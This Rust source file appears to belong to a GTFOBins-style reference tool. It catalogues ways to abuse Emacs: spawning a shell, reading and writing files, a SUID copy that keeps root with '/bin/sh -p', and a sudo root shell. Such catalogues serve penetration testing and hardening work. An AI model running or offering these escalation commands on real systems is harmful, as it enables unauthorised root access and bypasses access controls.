
pub static BIN_NAME: &'static str = "emacs";
pub static SH_CODE: &'static str = r#"
    
    emacs -Q -nw --eval '(term "/bin/sh")'
"#;
pub static FW_CODE: &'static str = r#"
    
    emacs file_to_write
    DATA
    C-x C-s
"#;
pub static FR_CODE: &'static str = r#"
    
    emacs file_to_read
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which emacs) .

    ./emacs -Q -nw --eval '(term "/bin/sh -p")'
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo emacs -Q -nw --eval '(term "/bin/sh")'
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FW: Code<'static> = Code { 
	title: "FW_CODE",
	code: FW_CODE,
	tag: Tag::FW,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
